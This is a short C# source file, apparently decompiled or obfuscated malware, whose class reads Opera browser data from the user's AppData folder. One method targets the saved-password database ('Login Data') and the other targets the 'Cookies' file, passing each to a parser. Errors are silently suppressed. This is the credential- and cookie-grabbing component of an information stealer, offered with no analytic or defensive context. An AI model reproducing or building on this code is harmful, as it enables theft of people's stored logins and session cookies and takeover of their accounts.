using System;
using System.Collections.Generic;
using System.IO;

public class GClass22
{
	public static List<GClass56> smethod_0()
	{
		try
		{
			return GClass9.smethod_0(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable\\Login Data"), "Opera");
		}
		catch (Exception)
		{
			return new List<GClass56>();
		}
	}

	public static List<GClass9.GClass10> smethod_1()
	{
		try
		{
			return GClass9.smethod_1(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable\\Cookies"), "Opera");
		}
		catch (Exception)
		{
			return new List<GClass9.GClass10>();
		}
	}
}
